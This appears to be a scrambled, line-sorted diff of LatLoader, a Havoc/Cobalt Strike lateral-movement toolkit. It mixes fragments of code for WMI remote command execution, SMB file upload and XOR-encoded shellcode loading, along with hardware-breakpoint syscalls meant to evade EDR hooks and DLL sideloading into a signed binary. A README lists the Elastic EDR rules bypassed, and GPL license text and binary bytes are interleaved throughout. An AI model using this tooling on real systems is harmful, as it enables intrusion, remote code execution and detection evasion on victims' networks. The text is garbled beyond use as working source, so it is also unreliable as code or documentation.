@@ -1,0 +1,2197 @@
+    
+     
+        
+            
+                
+                      
+                            Preamble
+                       TERMS AND CONDITIONS
+                     END OF TERMS AND CONDITIONS
+                    // Program has failed.
+                    ExceptionInfo->ContextRecord->Dr0 = callRegGadgetAddressRet
+                    GNU GENERAL PUBLIC LICENSE
+                    return EXCEPTION_CONTINUE_EXECUTION
+                  // Program has failed.
+                 // Program has failed.
+                // Program has failed.
+                //Set RIP to syscall
+                ExceptionInfo->ContextRecord->R10 = ExceptionInfo->ContextRecord->Rcx
+                ExceptionInfo->ContextRecord->Rax = syscallNumber
+                ExceptionInfo->ContextRecord->Rip = syscallReturnAddress
+                WORD syscallNumber = FindSyscallNumber(pFunctionAddress)
+                const size_t offset = idx 
+                if (syscallNumber == 0) {
+                if (syscallReturnAddress == 0) {
+                }
+               // Program has failed.
+             << std::hex << hres << std::endl
+            // Copy the stack arguments from the original stack
+            // Create a new stack to spoof the kernel32 function address
+            // Find the address of the syscall function in ntdll we got as the first argument of the PrepareSyscall function
+            // Move breakpoint back to PrepareSyscall to catch the next invoke
+            // Move breakpoint to the NTAPI function
+            // The stack size will be 0x70 which is compatible with the RET_GADGET we found.
+            //Arg: create the arg
+            //Free String in Mem
+            //Pass the arg to the Win32_ProcessStartup instance and clean it
+            << std::hex << hres << std::endl
+            BYTE high = 
+            BYTE low = 
+            DWORD64 pFunctionAddress = ExceptionInfo->ContextRecord->Rip
+            ExceptionInfo->ContextRecord->Dr0 = (UINT64)
+            ExceptionInfo->ContextRecord->Dr0 = ntFunctionAddress
+            ExceptionInfo->ContextRecord->Rsp -= 0x70
+            How to Apply These Terms to Your New Programs
+            SysFreeString(wcShowWindow)
+            VARIANT varParams
+            VariantClear(
+            VariantInit(
+            break
+            else {
+            for (size_t idx = 0
+            functionAddress = moduleBase 
+            return (DWORD_PTR)(dwAddress 
+            return (UINT64)pEntry->DllBase
+            return FALSE
+            return true
+            s = ''
+            syscallNumber = (high << 8) 
+            syscallReturnAddress = (DWORD64)((PBYTE)functionAddress 
+            varParams.intVal = SW_SHOW
+            varParams.vt = VT_I2
+            {
+            }
+        )
+        // check neighboring syscall down
+        // check neighboring syscall up
+        //Arg: the command to be executed
+        //BSTR wcCommandExecute = SysAllocString(bwcommandline)
+        //Free String
+        //Free String in mem
+        //Free Strings
+        //Store the arg in the Win32_ProcessStartup and clean it
+        //Store the value for the in parameters
+        CoUninitialize()
+        HRESULT  WINAPI
+        HRESULT  WINAPI 
+        NULL                         // Reserved
+        PVOID Reserved6
+        SysFreeString(wcCommandExecute)
+        SysFreeString(wcCommandLine)
+        SysFreeString(wcCurrentDirectory)
+        SysFreeString(wcProcessStartupInfo)
+        ULONG CheckSum
+        VARIANT varCommand
+        VARIANT varCurrentDir
+        VARIANT vtDispatch
+        VariantClear(
+        VariantInit(
+        break
+        decoded[i] = encoded[i] 
+        domain   = params[ 4 ]
+        else if (ExceptionInfo->ContextRecord->Rip == (DWORD64)ntFunctionAddress) {
+        encoded.append(test)
+        fmt = '<I'
+        fmt = '<h'
+        if (
+        if (ExceptionInfo->ContextRecord->Rip == (DWORD64)
+        if (MaskCompare((PBYTE)(dwAddress 
+        if (_stricmp((char
+        if (retGadgetAddress != 0) {
+        if s is None:
+        is_current = False
+        key = ''.join(random.choice(letters) for i in range(49))
+        letters = string.ascii_letters 
+        pListEntry != 
+        pListEntry = pListEntry->Flink) {
+        pLoc->Release()
+        pSvc->Release()
+        params = params[0]
+        password = params[ 3 ]
+        pclsObj->Release()
+        return -1
+        return -2
+        return 0
+        return 1
+        return EXCEPTION_CONTINUE_EXECUTION
+        return False
+        return false
+        return functionAddress
+        return true
+        self.buffer 
+        self.buffer : bytes = b''
+        self.size 
+        self.size   : int   = 0
+        test = contents[b] 
+        username = params[ 2 ]
+        varCommand.bstrVal = NULL
+        varCommand.bstrVal = wcCommandExecute
+        varCommand.vt = VT_BSTR
+        varCurrentDir.bstrVal = NULL
+        varCurrentDir.vt = VT_BSTR
+        vtDispatch.byref = pStartupInstance
+        vtDispatch.vt = VT_DISPATCH
+        {
+        }
+       EOAC_NONE                       // proxy capabilities 
+      else
+      if (dwBytesWritten != dwBytesToWrite)
+      return
+      {
+      }
+     /
+    ((void(
+    (at your option) any later version.
+    )
+    /
+    // ========
+    // @sektor7 - RED TEAM Operator: Windows Evasion course - https://blog.sektor7.net/
+    // ADDED CODE TO EXECUTE
+    // Apply the modified context to the current thread
+    // Call function to load shellcode
+    // Checking that the image is valid PE file.
+    // Cleanup
+    // Connect to WMI through the IWbemLocator::ConnectServer method
+    // Connect to the remote root
+    // Create COAUTHIDENTITY that can be used for setting security on proxy
+    // Dynamically find the GetThreadContext and SetThreadContext functions
+    // GET COMMAND FROM ARGV. Make sure you run via cmd if redirecting output
+    // GET TARGET SERVER FROM CLI. MUST CONVERT INTO BSTR USING METHOD DESCRIBED BELOW
+    // Get current thread context
+    // Get size of raw shellcode file
+    // Initialize COM. ------------------------------------------
+    // Iterating the export directory.
+    // Load original DLL and get function pointer
+    // Obtain the initial locator to WMI -------------------------
+    // Register exception handler
+    // Set general COM security levels --------------------------
+    // Set hardware breakpoint on PrepareSyscall function
+    // Set security levels on a WMI connection ------------------
+    // Step 1: --------------------------------------------------
+    // Step 2: --------------------------------------------------
+    // Step 3: ---------------------------------------------------
+    // Step 4: -----------------------------------------------------
+    // Step 6: --------------------------------------------------
+    // Step 7: --------------------------------------------------
+    // Use the IWbemServices pointer to make requests of WMI ----
+    // XOR key. Make sure it matches the key used to encode shellcode
+    // and obtain pointer pSvc to make IWbemServices calls.
+    // decode shellcode and free heap memory
+    // https://stackoverflow.com/questions/606075/how-to-convert-char-to-bstr
+    // random crap... helps evade some signatures
+    // random crap... helps evade some signatures feel free to replace with whatever...
+    // step 5: --------------------------------------------------
+    //---------------------------------------------------------
+    //Execute Method
+    //Filling the pStartupInstance
+    //Handling command execution
+    //We will fill the parameters in the pParamsInstance instance
+    //de-init syscalls
+    //execute shellcode via function pointer
+    //init syscalls
+    //pInParamsDefinition will receive the paramters signature for the Win32_Process.Create(...) method. We should fill these params and call the method
+    7.  This requirement modifies the requirement in section 4 to
+    <one line to give the program's name and a brief idea of what it does.>
+    <program>  Copyright (C) <year>  <name of author>
+    Appropriate Legal Notices
+    BYTE           Reserved1[16]
+    BYTE       Reserved1[8]
+    BYTE BeingDebugged
+    BYTE Reserved1[2]
+    BYTE Reserved2[21]
+    BYTE Reserved3[520]
+    BYTE Reserved4[136]
+    BYTE Reserved4[8]
+    COAUTHIDENTITY 
+    COAUTHIDENTITY authIdent
+    CONTEXT ctx = { 0 }
+    CoUninitialize()
+    Copyright (C) <year>  <name of author>
+    Corresponding Source along with the object code.  If the place to
+    Corresponding Source fixed on a durable physical medium
+    Corresponding Source from a network server at no charge.
+    Corresponding Source in the same way through the same place at no
+    Corresponding Source.  Regardless of what server hosts the
+    DWORD
+    DWORD mode = 0
+    DWORD old = 0
+    DWORD64 syscallReturnAddress = 0
+    DWORD_PTR dwAddress = 0
+    DWORD_PTR sectionOffset = (DWORD_PTR)imageBase 
+    FILE 
+    GNU General Public License for more details.
+    HANDLE hStdin = GetStdHandle(STD_INPUT_HANDLE)
+    HRESULT hres
+    IMAGE_OPTIONAL_HEADER optionalHeader = ntHeaders->OptionalHeader
+    IWbemClassObject
+    IWbemLocator 
+    IWbemServices 
+    LIST_ENTRY
+    LIST_ENTRY InMemoryOrderLinks
+    LIST_ENTRY InMemoryOrderModuleList
+    License to anyone who comes into possession of a copy.  This
+    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+    NTSTATUS status = 0
+    Notices displayed by works containing it
+    NtAllocateVirtualMemory_t pNtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)PrepareSyscall((char
+    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase
+    PIMAGE_DOS_HEADER imageBase = (PIMAGE_DOS_HEADER)GetModuleHandleA(moduleName)
+    PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)(moduleBase 
+    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(moduleBase 
+    PIMAGE_SECTION_HEADER textSection = (PIMAGE_SECTION_HEADER)(sectionOffset)
+    PPEB peb = (PPEB)__readgsqword(X64_PEB_OFFSET)
+    PPEB_LDR_DATA LoaderData
+    PRTL_USER_PROCESS_PARAMETERS ProcessParameters
+    PVOID          Reserved2[10]
+    PVOID      Reserved2[3]
+    PVOID DllBase
+    PVOID EntryPoint
+    PVOID PostProcessInitRoutine
+    PVOID Reserved1[2]
+    PVOID Reserved2[2]
+    PVOID Reserved3
+    PVOID Reserved5[3]
+    PVOID base_addr = NULL
+    PWSTR  Buffer
+    SIZE_T size = ftell(file)
+    Source of the work are being offered to the general public at no
+    SysFreeString(srv)
+    TaskID : str    = None
+    This program comes with ABSOLUTELY NO WARRANTY
+    This program is free software: you can redistribute it and/or modify
+    UINT64 functionAddress = 0
+    ULONG SessionId
+    ULONG TimeDateStamp
+    UNICODE_STRING CommandLine
+    UNICODE_STRING FullDllName
+    UNICODE_STRING ImagePathName
+    USHORT Length
+    USHORT MaximumLength
+    WORD
+    WORD syscallNumber = 0
+    You should have received a copy of the GNU General Public License
+    _In_ CONST CONTEXT
+    _Inout_ LPCONTEXT lpContext
+    a) Disclaiming warranty or limiting liability differently from the
+    a) The work must carry prominent notices stating that you modified
+    any liability that these contractual assumptions directly impose on
+    author attributions in that material or in the Appropriate Legal
+    authors of the material
+    available for as long as needed to satisfy these requirements.
+    b) Requiring preservation of specified reasonable legal notices or
+    b) The work must carry prominent notices stating that it is
+    but WITHOUT ANY WARRANTY
+    c) Convey individual copies of the object code with a copy of the
+    case DLL_PROCESS_ATTACH:
+    case DLL_PROCESS_DETACH:
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    char 
+    char targetHost[50]
+    charge under subsection 6d.
+    clear directions next to the object code saying where to find the
+    command    = ''
+    command = params[ 1 ]
+    contents = file.read()
+    copy of the Corresponding Source for all the software in the
+    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS
+    ctx.Dr0 = (UINT64)
+    ctx.Dr7 
+    customarily used for software interchange.
+    d) Convey the object code by offering access from a designated
+    d) Limiting the use for publicity purposes of names of licensors or
+    decoded = (unsigned char
+    def __init__(self):
+    def getbuffer(self):
+    demon  : Demon  = None
+    demon  = Demon( demonID )
+    demonFile = params[1]
+    domain     = ''
+    dwAddress = FindPattern((DWORD_PTR)imageBase 
+    e) Declining to grant rights under trademark law for use of some
+    else
+    else {
+    encoded = []
+    f) Requiring indemnification of licensors and authors of that
+    f.close()
+    fclose(file)
+    file.close()
+    file.write(bytes(encoded))
+    fileBytes = f.read()
+    for (
+    for (DWORD i = 0
+    for (DWORD j = 0
+    for (LIST_ENTRY
+    for (WORD idx = 1
+    for (int i = 0
+    for b in range(len(contents)):
+    free(decoded)
+    free(shellcode)
+    further charge.  You need not require recipients to copy the
+    hittem()
+    hres =  CoInitializeSecurity(
+    hres = CoCreateInstance(
+    hres = CoSetProxyBlanket(
+    hres = S_OK
+    hres = pLoc->ConnectServer(
+    if (!FindRetGadget()) {
+    if (!InitHWSyscalls())
+    if (!SUCCEEDED(hres)) {
+    if (!exceptionHandlerHandle) {
+    if (!imageBase)
+    if (!moduleName)
+    if (!pNtAllocateVirtualMemory) {
+    if (!sectionOffset)
+    if (DeinitHWSyscalls())
+    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
+    if (FAILED(hres))
+    if (SUCCEEDED(hres)) {
+    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
+    if (file == NULL) return 1
+    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
+    if (optionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress == 0) {
+    if (retGadgetAddress != 0) {
+    if (syscallNumber == 0)
+    if (syscallReturnAddress == 0)
+    if demon.ProcessArch == 'x86':
+    if num_params < 2:
+    if num_params == 6:
+    if num_params > 2 and num_params < 5:
+    if num_params > 5:
+    if type(params[0]) == tuple:
+    if( pclsObj )
+    invalidate such permission if you have separately received it.
+    is_current = False
+    it under the terms of the GNU General Public License as published by
+    long as you offer spare parts or customer support for that product
+    long int size = ftell(file)
+    material by anyone who conveys the material (or modified versions of
+    may be on a different server (operated by you or a third party)
+    more than your reasonable cost of physically performing this
+    myThread = GetCurrentThread()
+    num_params = len(params)
+    pEnumerator->Release()
+    pLoc->Release()
+    pSvc->Release()
+    packer = WmiPacker()
+    packer.addWstr(command)
+    packer.addWstr(domain)
+    packer.addWstr(password)
+    packer.addWstr(target)
+    packer.addWstr(username)
+    packer.addbool(is_current)
+    packer.addstr(fileBytes)
+    packer.addstr(remotePath)
+    packer.addstr(target)
+    packer.adduint32(len(fileBytes))
+    password   = ''
+    reasonable ways as different from the original version
+    regardless of how they are packaged.  This License gives no
+    released under this License and any conditions added under section
+    requiring that modified versions of such material be marked in
+    return 0
+    return EXCEPTION_CONTINUE_SEARCH
+    return RemoveVectoredExceptionHandler(exceptionHandlerHandle) != 0
+    return SetMainBreakpoint()
+    return TRUE
+    return TaskID
+    return dwAddress
+    return false
+    return functionAddress
+    return ntFunctionAddress
+    return result
+    return syscallNumber
+    return syscallReturnAddress
+    return true
+    return wa
+    size_t size = strlen(text) 
+    switch (ul_reason_for_call)
+    target     = ''
+    target  = f'
+    target = params[0]
+    targetFile = params[1]
+    targetHost = params[0]
+    terms of sections 15 and 16 of this License
+    those licensors and authors.
+    under certain conditions
+    union {
+    unsigned char 
+    username   = ''
+    void 
+    wchar_t
+    with subsection 6b.
+    work need not make them do so.
+    written offer to provide the Corresponding Source.  This
+    you inform other peers where the object code and Corresponding
+    {
+    }
+   /
+   // Program successfully completed.
+  // Get size of raw shellcode file
+  //DWORD dwBytesToWrite = (DWORD)strlen(DataBuffer)
+  0. Definitions.
+  1. Source Code.
+  10. Automatic Licensing of Downstream Recipients.
+  11. Patents.
+  12. No Surrender of Others' Freedom.
+  13. Use with the GNU Affero General Public License.
+  14. Revised Versions of this License.
+  15. Disclaimer of Warranty.
+  16. Limitation of Liability.
+  17. Interpretation of Sections 15 and 16.
+  2. Basic Permissions.
+  3. Protecting Users' Legal Rights From Anti-Circumvention Law.
+  4. Conveying Verbatim Copies.
+  5. Conveying Modified Source Versions.
+  6. Conveying Non-Source Forms.
+  7. Additional Terms.
+  8. Termination.
+  9. Acceptance Not Required for Having Copies.
+  A compilation of a covered work with other separate and independent
+  All rights granted under this License are granted for the term of
+  BOOL bErrorFlag = FALSE
+  BeaconDataExtract(datap 
+  BeaconDataParse(
+  BeaconFormatToString(formatp 
+  CloseHandle(hFile)
+  Conveying under any other circumstances is permitted solely under
+  DWORD dwBytesToWrite = size
+  DWORD dwBytesWritten = 0
+  DWORD dwMilliseconds
+  Developers that use the GNU GPL protect your rights with two steps:
+  Each version is given a distinguishing version number.  If the
+  FILE 
+  HANDLE                hTemplateFile
+  HANDLE hFile
+  HANDLE hObject
+  IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING
+  If the Program specifies that a proxy can decide which future
+  If the disclaimer of warranty and limitation of liability provided
+  KERNEL32$CloseHandle(hFile)
+  LPOVERLAPPED lpOverlapped
+  Later license versions may give you additional or different
+  No covered work shall be deemed part of an effective technological
+  Nothing in this License shall be construed as excluding or limiting
+  Some devices are designed to deny users access to install or run
+  Termination of your rights under this section does not terminate the
+  The Corresponding Source for a work in source code form is that
+  The Corresponding Source need not include anything that users
+  The Free Software Foundation may publish revised and/or new versions of
+  The GNU General Public License does not permit incorporating your program
+  The licenses for most software and other practical works are designed
+  The requirement to provide Installation Information does not include a
+  You are not required to accept this License in order to receive or
+  You may convey a covered work in object code form under the terms
+  You may convey verbatim copies of the Program's source code as you
+  You may not impose any further restrictions on the exercise of the
+  You may not propagate or modify a covered work except as expressly
+  char 
+  char filePath[500]
+  datap  parser
+  dwBytesToWrite = BeaconDataInt(
+  else
+  fclose(file)
+  if (FALSE == bErrorFlag)
+  if (file == NULL) return 1
+  if (hFile == INVALID_HANDLE_VALUE) 
+  long int size = ftell(file)
+  remotePath = BeaconDataExtract(
+  return 0
+  size_t    dwBytesToWrite
+  targetHost = BeaconDataExtract(
+  unsigned char 
+  { 
+ (V[
+ -------------------------
+ -c wmiBOF.cpp -w -o /share/ProcCreate.x64.o 
+ -o /share/test.exe wmiexec.cpp -I include -l oleaut32 -l ole32 -l wbemuuid -w -static
+ -static sideloader.cpp HWSyscalls.cpp cryptbase.def -s -w -shared -o /share/sideloader.dll -fpermissive
+ //Class name
+ //Create an instance of Win32_ProcessStartup
+ 0x70)
+ 1) == 0x05) {
+ A Beacon Object File is a light-weight post exploitation tool that runs
+ Adopted From: https://wikileaks.org/ciav7p1/cms/page_11628905.html
+ BOF like so:
+ Beacon Object Files (BOF)
+ Big big huge thanks for Raffi (rsmudge) for showing me how to create BOF with C
+ Change this to match the key used in the loaders. Or maybe make modifications to dymaically generate a random key each time. 
+ Cobalt Strike 4.1.
+ DOWN)
+ DOWN) == 0x00
+ DOWN) == 0x00) {
+ DOWN) == 0x4c
+ DOWN) == 0x8b
+ DOWN) == 0xb8
+ DOWN) == 0xd1
+ DataBuffer = (unsigned char 
+ DataBuffer = BeaconDataExtract(
+ Dependencies/Basic Usage
+ Elastic EDR Rule Evasions
+ Everyone is permitted to copy and distribute verbatim copies
+ ExceptionInfo)
+ ExceptionInfo) {
+ Execute shellcode loader via DLL sideloading cryptbase.dll into DiskSnapShot.exe
+ Generate key if one is not supplied
+ GetThreadContext_t)(
+ Greetz/Credit
+ Gui>z5
+ I5:
+ Identifies the creation or change of a Windows executable file over network shares. Adversaries may transfer tools or other files between systems in a compromised environment.
+ Identifies the execution of a file that was created by the virtual system process and subsequently executed. This may indicate lateral movement via network file shares.
+ Identifies the execution of a file that was created by the virtual system process. This may indicate lateral movement via network file shares.
+ Identifies the execution of a recently created file that is unsigned or untrusted and from a remote network logon. This may indicate lateral movement via remote services.
+ Identifies the load of an unsigned or untrusted DLL by a trusted binary followed by calling VirtualProtect API to change memory permission to execute or write. This may indicate execution via DLL sideloading to perform code injection.
+ Identifies when a Microsoft signed binary is copied to a directory and shortly followed by the loading of an unsigned DLL from the same directory. Adversaries may opt for moving Microsoft signed binaries to a random directory and use them as a host for malicious DLL sideloading during the installation phase.
+ If you are looking to achieve 0 alerts by Elastic when using 
+ LatLoader
+ Modified by Phil Keeble (@The_Keeb) and Steve Embling to tie in aggressor and make it dynamic
+ ModuleList = NULL
+ Move write.exe to directory containing dll
+ Notes
+ Output Functions 
+ PLDR_DATA_TABLE_ENTRY
+ PPEB
+ PPEB_LDR_DATA
+ PRTL_USER_PROCESS_PARAMETERS
+ PUNICODE_STRING
+ STACK_ARGS_LENGTH 
+ STACK_ARGS_RSP_OFFSET
+ SetThreadContext_t)(
+ Spawn
+ Standalone binaries
+ The default DLL sideloader utilizes the [HWSyscalls](https://github.com/ShorSec/HWSyscalls) project to perform a single 
+ This project is a PoC meant for learning purposes. Never use this in a real world environment. It was not designed for that and you will most definitely get burned unless you heavily modify the tool.
+ This rule was bypassed by performing DLL sideloading.
+ This rule was bypassed by signing the DLL sideloader with an expired cert. The expired cert was obtained from here: https://github.com/utoni/PastDSE/tree/main/certs
+ Token Functions 
+ UP)
+ UP) == 0x00
+ UP) == 0x00) {
+ UP) == 0x4c
+ UP) == 0x8b
+ UP) == 0xb8
+ UP) == 0xd1
+ Usage/Subcommands
+ Utility Functions 
+ WMI Lateral Movement Via Create Process
+ Write to dll sideloader to target location
+ [@Yaxser](https://twitter.com/Yas_o_h) for their [wmiexec BOF](https://github.com/Yaxser/CobaltStrike-BOF/blob/master/WMI%20Lateral%20Movement/WMI-ProcessCreate.cpp) which was lightly modified for use in this project.
+ [@dec0ne](https://twitter.com/dec0ne) and [@Idov31](https://twitter.com/Idov31) for [HWSyscalls](https://github.com/ShorSec/HWSyscalls) utilized by the DLL sideloader.
+ [Elastic](https://www.elastic.co) for allowing anyone to test their EDR for free and for making their default rules public.
+ [Malicious Behavior Detection Alert: Execution of a File Dropped from SMB](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/lateral_movement_execution_of_a_file_dropped_from_smb.toml)
+ [Malicious Behavior Detection Alert: ImageLoad of a File dropped via SMB](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/lateral_movement_imageload_of_a_file_dropped_via_smb.toml)
+ [Malicious Behavior Detection Alert: Unsigned File Execution via Network Logon](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/lateral_movement_unsigned_file_execution_via_network_logon.toml)
+ [Malicious Behavior Prevention Alert: DLL Side Loading via a Copied Microsoft Executable](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/defense_evasion_dll_side_loading_via_a_copied_microsoft_executable.toml)
+ [Malicious Behavior Prevention Alert: VirtualProtect API Call from an Unsigned DLL](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/defense_evasion_virtualprotect_api_call_from_an_unsigned_dll.toml)
+ [Microsoft's Online Documentation](https://learn.microsoft.com) for teaching me all about windows programming and internals. They also provide excellent example code that I and others gladly take and adopt for our offensive needs.
+ [Potential Lateral Tool Transfer via SMB Share](https://www.elastic.co/guide/en/security/current/potential-lateral-tool-transfer-via-smb-share.html)
+ [Remote Execution via File Shares](https://www.elastic.co/guide/en/security/current/remote-execution-via-file-shares.html)
+ [WMI Incoming Lateral Movement](https://www.elastic.co/guide/en/security/current/wmi-incoming-lateral-movement.html)
+ addresses = (DWORD
+ addresses[ordinals[j]]
+ and 
+ and each file should have at least
+ and give all
+ authInfo = (COAUTHINFO
+ authidentity = (COAUTHIDENTITY
+ buffer
+ bwcommandline
+ bwdomain
+ bwpassword
+ bwtarget2
+ bwusername
+ charToWChar(const char
+ command can be used to upload a local file to a remote system via SMB using the 
+ commented out for added code
+ current pointer into our buffer 
+ data API 
+ debug arguments passed from havoc module
+ decoded
+ dosHeader->e_lfanew)
+ echo --path C:
+ exportDirectory->AddressOfFunctions)
+ exportDirectory->AddressOfNameOrdinals)
+ exportDirectory->AddressOfNames)
+ feel free to replace with whatever...
+ for details type 
+ format API 
+ format)
+ functionName)
+ functionName) {
+ i < dwLen
+ i < size
+ i21}k
+ id = (COAUTHIDENTITY
+ idx
+ idx 
+ idx < STACK_ARGS_LENGTH
+ idx <= 32
+ idx <= 500
+ idx)
+ idx) == 0x0f 
+ imageBase->e_lfanew 
+ inf = (COAUTHINFO
+ initialize encrypted byte array
+ instead of 
+ is the standalone binary for command execution via WMI. It can be compiled with mingw like so:
+ is the standalone binary for file transfer via SMB. It can be compiled with mingw like so:
+ it applies also to
+ j < exportDirectory->NumberOfNames
+ key[i % keylen]
+ locator = NULL
+ low 
+ low - idx
+ lpContext
+ names = (DWORD
+ offset 
+ offset) = 
+ opcode address
+ optionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress)
+ ord(key[b % len(key)])
+ ordinals = (WORD
+ original
+ pClass = NULL
+ pInParamsDefinition = NULL
+ pInfo)
+ pListEntry = peb->LoaderData->InMemoryOrderModuleList.Flink
+ pOutParams = NULL
+ pParamsInstance = NULL
+ pStartupInstance = NULL
+ pStartupObject = NULL
+ pSvc = 0
+ parser)
+ ppv)
+ read input file as raw bytes    
+ remaining length of data 
+ remotePath
+ required if params are passed directly as 
+ section 10
+ self.buffer
+ shellcode = (unsigned char 
+ size)
+ sizeof(IMAGE_NT_HEADERS)
+ spare us some name mangling... 
+ store as each byte as hex string in array
+ string.digits
+ subcommand can be used to execute a command on a remote system via WMI using the 
+ subcommand combines the two subcommands above to transfer a specified exe to the remote host via SMB and execute it over WMI:
+ subcommand to demonstrate how they can be combined to create a fully functional PoC.
+ subcommand will perform lateral movement by DLL sideloading a simple shellcode loader. Actions were also taken to evade various elastic EDR rules.
+ subcommand will perform lateral movement using a simple shellcode loader. This is designed to bypass basic AV detections:
+ szMask)
+ targetHost
+ text)
+ the original buffer [so we can free it] 
+ total size of this buffer 
+ type 
+ upload xor encoded demon to target location
+ wa = new wchar_t[size]
+ with Beacon's inline-execute command.
+ without even the implied warranty of
+ wmiexec.cpp -I include -l oleaut32 -l ole32 -l wbemuuid -w -static -o /share/wmiexec.exe
+ xor encode provided raw shellcode file
+!-CgQ
+!EptWx
+!XPBvI3
+![exec](https://github.com/icyguider/LatLoader/assets/79864975/90d569fc-ee15-4ed4-9ad5-d984454ea597)
+![help](https://github.com/icyguider/LatLoader/assets/79864975/340d7cf5-2307-48ef-9e7c-fcd8f7cb103b)
+![load](https://github.com/icyguider/LatLoader/assets/79864975/ea475419-ca1a-4786-b40c-6716638e1e5b)
+![rupload](https://github.com/icyguider/LatLoader/assets/79864975/9f5b6315-7414-4c09-a5e1-68900ad58f4a)
+![sideload](https://github.com/icyguider/LatLoader/assets/79864975/8af2aa2e-7ddb-496d-8b34-dc67860b38c8)
+![xorload](https://github.com/icyguider/LatLoader/assets/79864975/384c9c70-aeeb-4b5d-a261-3a5724468009)
+!res/2021/halosgate.md
+"                       Version 3, 29 June 2007"
+"                // mov r10, rcx"
+"                //mov eax, SSN"
+"                DWORD64 syscallReturnAddress = FindSyscallReturnAddress(pFunctionAddress, syscallNumber)"
+"                printf(""["
+"            // mov rsp, REG_GADGET_ADDRESS"
+"            // sub rsp, 70"
+"            << "" Err code = 0x"""
+"            BSTR wcShowWindow = SysAllocString(L""ShowWindow"")"
+"            char nonHookedSyscallBytes[] = { 0x4C,0x8B,0xD1,0xB8 }"
+"            hres = pStartupInstance->Put(wcShowWindow, 0, "
+"            if (FindPattern(pFunctionAddress, 4, (PBYTE)nonHookedSyscallBytes, (PCHAR)""xxxx"")) {"
+"            ntFunctionAddress = GetSymbolAddress((UINT64)hNtdll, (const char"
+"            printf("""
+"            printf(""=============================================="
+"            printf(""["
+"            s = s.encode(""utf-8"" )"
+"          BeaconPrintf(CALLBACK_OUTPUT, ""Error: dwBytesWritten != dwBytesToWrite"
+"          BeaconPrintf(CALLBACK_OUTPUT, ""Wrote %d bytes to %s successfully."
+"          printf(""Error: dwBytesWritten != dwBytesToWrite"
+"          printf(TEXT(""Wrote %d bytes to %s successfully."
+"        -1,                          // COM authentication"
+"        //BSTR wcCommandExecute = SysAllocString(L""cmd.exe /c "
+"        0, "
+"        BSTR wcCommandLine = SysAllocString(L""CommandLine"")"
+"        BSTR wcCurrentDirectory = SysAllocString(L""CurrentDirectory"")"
+"        BSTR wcProcessStartupInfo = SysAllocString(L""ProcessStartupInformation"")"
+"        CLSCTX_INPROC_SERVER, "
+"        CLSID_WbemLocator,             "
+"        EOAC_NONE,                   // Additional capabilities "
+"        IID_IWbemLocator, (LPVOID "
+"        NULL,                              // Context object "
+"        NULL,                              // Locale             "
+"        NULL,                              // Security flags"
+"        NULL,                        // Authentication info"
+"        NULL,                        // Authentication services"
+"        NULL,                        // Reserved"
+"        NULL,     // User password"
+"        NULL,    // User name"
+"        NULL, "
+"        NULL,// Authority        "
+"        PLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks)"
+"        RPC_C_AUTHN_LEVEL_DEFAULT,   // Default authentication "
+"        RPC_C_IMP_LEVEL_IDENTIFY,    // Default Impersonation  "
+"        demon.ConsoleWrite( demon.CONSOLE_ERROR, ""Not enough parameters"" )"
+"        demon.ConsoleWrite( demon.CONSOLE_ERROR, ""Too many parameters"" )"
+"        demon.ConsoleWrite( demon.CONSOLE_ERROR, ""x86 is not supported"" )"
+"        fmt = ""<L{}s"".format(len(b))"
+"        fmt = ""<L{}s"".format(len(s) "
+"        hres = pParamsInstance->Put(wcCommandLine, 0, "
+"        hres = pParamsInstance->Put(wcCurrentDirectory, 0, "
+"        hres = pParamsInstance->Put(wcProcessStartupInfo, 0, "
+"        if (wcsstr(pEntry->FullDllName.Buffer, moduleName)) {"
+"        if isinstance(s, str):"
+"        print(f""[debug] [exec] num_params1: {num_params}"")"
+"        print(f""[debug] [exec] num_params: {num_params}"")"
+"        printf(""ExecMethod Succeeded!"")"
+"        printf(""ExecMethod failed: 0x%08x"", hres)"
+"        printf(""GetMethod failed: 0x%08x"", hres)"
+"        printf(""GetObject failed: 0x%08x"", hres)"
+"        printf(""GetObject2 failed: 0x%08x"", hres)"
+"        printf(""SpawnInstance failed: 0x%08x"", hres)"
+"        printf(""SpawnInstance2 failed: 0x%08x"", hres)"
+"        printf(""[!] Could not find a suitable "
+"        printf(""[!] Could not register VEH: 0x%X"
+"        printf(""["
+"        printf(""[-] Could not find "
+"        printf(""[-] Could not find SSN"
+"        printf(""[-] Could not set new thread context: 0x%X"", GetLastError())"
+"        retGadgetAddress = FindInModule(""kernelbase.dll"", (PBYTE)"""
+"        return pack(""<L"", self.size) "
+"        s = s.encode(""utf-16_le"")"
+"        srv,"
+"        std::cerr << ""[-] Failed to clean up the exception handler."" << std::endl"
+"        std::cerr << ""[-] Failed to prepare syscall for NtAllocateVirtualMemory."" << std::endl"
+"        std::cout << ""Could not connect. Error code = 0x"" "
+"        std::cout << ""Could not set proxy blanket. Error code = 0x"" "
+"        std::cout << ""Failed to create IWbemLocator object."""
+"        std::cout << ""Failed to initialize COM library. Error code = 0x"" "
+"        std::cout << ""Failed to initialize security. Error code = 0x"" "
+"        std::cout << ""["
+"       COLE_DEFAULT_PRINCIPAL,         // Server principal name "
+"       RPC_C_AUTHN_DEFAULT,            // RPC_C_AUTHN_xxx"
